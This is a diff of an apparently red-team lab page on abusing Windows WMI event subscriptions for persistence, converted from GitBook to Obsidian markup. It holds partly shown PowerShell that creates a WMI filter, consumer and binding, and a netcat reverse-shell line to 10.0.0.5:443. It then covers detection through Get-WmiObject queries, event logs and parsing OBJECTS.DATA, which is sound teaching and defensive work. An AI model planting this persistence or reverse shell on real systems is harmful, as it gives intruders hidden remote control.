@@ -1,5 +1,6 @@
 ---
 description: Persistence, Privilege Escalation
+tags: [#privilege-escalation, #persistence]
 ---
 
 # Abusing Windows Managent Instrumentation
@@ -16,8 +17,8 @@ WMI Events can be used by both offenders (persistence, i.e launch payload when s
 
 Creating `WMI __EVENTFILTER`, `WMI __EVENTCONSUMER` and `WMI __FILTERTOCONSUMERBINDING`:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 # WMI __EVENTFILTER
 $wmiParams = @{
     ErrorAction = 'Stop'
@@ -50,55 +51,50 @@ $wmiParams.Arguments = @{
 
 $bindingResult = Set-WmiInstance @wmiParams
 ```
-{% endcode %}
 
 Note that the `ExecutablePath` property of the `__EVENTCONSUMER` points to a rudimentary netcat reverse shell:
 
-{% code title="c:\shell.cmd" %}
 ```csharp
+// c:\shell.cmd
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
-{% endcode %}
 
 ## Observations
 
 Note the process ancestry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:
 
-![](../../../.gitbook/assets/wmi-shell-system.png)
+![[wmi-shell-system.png]]
 
 On the victim/suspected host, we can see all the regsitered WMI event filters, event consumers and their bindings and inspect them for any malicious intents with these commands:
 
-{% code title="__EventFilter@victim" %}
 ```csharp
+// __EventFilter@victim
 Get-WmiObject -Class __EventFilter -Namespace root\subscription
 ```
-{% endcode %}
 
 Note the `Query` property suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
 
-![](../../../.gitbook/assets/wmi-filter.png)
+![[wmi-filter.png]]
 
 Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:
 
-{% code title="__EventConsumer@victim" %}
 ```csharp
+// __EventConsumer@victim
 Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 ```
-{% endcode %}
 
-![](../../../.gitbook/assets/wmi-consumer.png)
+![[wmi-consumer.png]]
 
-{% code title="__FilterToConsumerBinding@victim" %}
 ```csharp
+// __FilterToConsumerBinding@victim
 Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 ```
-{% endcode %}
 
-![](../../../.gitbook/assets/wmi-binding.png)
+![[wmi-binding.png]]
 
 Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture event filter and event consumer creations on the victim system:
 
-![](../../../.gitbook/assets/wmi-filter-consumer-creation.png)
+![[wmi-filter-consumer-creation.png]]
 
 ## Inspection
 
@@ -110,7 +106,7 @@ Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI\_F
 ./PyWMIPersistenceFinder.py OBJECTS.DATA
 ```
 
-![](../../../.gitbook/assets/wmi-parser.png)
+![[wmi-parser.png]]
 
 ### Strings + Grep
 
@@ -122,7 +118,7 @@ strings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color
 
 Below are the results:
 
-![](../../../.gitbook/assets/wmi-strings-grep.png)
+![[wmi-strings-grep.png]]
 
 From the above graphic, we can easily see that one binding connects two evils - the evil consumer and the evil filter.
 
@@ -134,24 +130,24 @@ strings OBJECTS.DATA | grep -i 'evil' -B3 -A2 --color
 
 Note how we can get a pretty decent glimpse into the malicious WMI persistence even with simple tools to hand - note the `C:\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very [beginning](./#execution) of the lab:
 
-![](../../../.gitbook/assets/wmi-strings-grep2.png)
+![[wmi-strings-grep2.png]]
 
 ## References
 
 Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources listed below:&#x20;
 
-{% embed url="https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/" %}
+[learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions](https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/)
 
-{% embed url="https://www.youtube.com/watch?v=0SjMgnGwpq8" %}
+[www.youtube.com/watch?v=0SjMgnGwpq8](https://www.youtube.com/watch?v=0SjMgnGwpq8)
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1084" %}
+[attack.mitre.org/wiki/Technique/T1084](https://attack.mitre.org/wiki/Technique/T1084)
 
-{% embed url="https://www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-with-powershell-part-1-what-it-is.html" %}
+[www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-with-powershell-part-1-what-it-is.html](https://www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-with-powershell-part-1-what-it-is.html)
 
-{% embed url="https://pentestarmoury.com/2016/07/13/151/" %}
+[pentestarmoury.com/2016/07/13/151](https://pentestarmoury.com/2016/07/13/151/)
 
-{% embed url="https://msdn.microsoft.com/en-us/library/aa394084%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396" %}
+[msdn.microsoft.com/en-us/library/aa394084%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396](https://msdn.microsoft.com/en-us/library/aa394084%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396)
 
-{% embed url="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/" %}
+[www.eideon.com/2018-03-02-THL03-WMIBackdoors](https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/)
 
-{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5)" %}
+[docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5)](https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5))
